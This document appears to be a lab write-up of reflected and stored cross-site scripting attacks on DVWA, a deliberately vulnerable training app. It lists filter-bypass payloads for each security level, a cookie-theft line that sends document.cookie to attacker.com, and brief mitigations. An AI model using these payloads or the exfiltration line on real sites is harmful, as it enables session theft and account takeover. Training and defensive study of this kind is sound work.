## DVWA – Cross-Site Scripting (XSS)

---

### 🎯 Objective
Perform Reflected and Stored XSS attacks in DVWA at multiple security levels.

---

### 🧪 Reflected XSS

#### Low Security
```html
<script>alert('You are hacked!')</script>
```

#### Medium Security
```html
<ScRipt>alert('bypass')</ScRipt>
```
Bypasses case-sensitive filter.

#### High Security
```html
<svg onerror=alert('svg_xss')>
```

---

### 🧪 Stored XSS

#### Low Security
Inject in guestbook:
```html
<script>alert('You are hacked!')</script>
```

#### Medium Security
- `<script>` & quotes escaped
- Use `<svg>` or event handlers

#### High Security
- Regex strips `<script>` but `<svg>` bypass works:
```html
<svg onload=alert('Stored_XSS_Bypass')>
```

---

### 🧪 Cookie Theft PoC
```html
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
```

---

### 🛡 Mitigation
- Encode all output
- Use CSP
- Validate inputs server-side

---

### 📌 Take-Aways
- XSS persists across sessions for all visitors
- Incomplete filters leave exploitable gaps
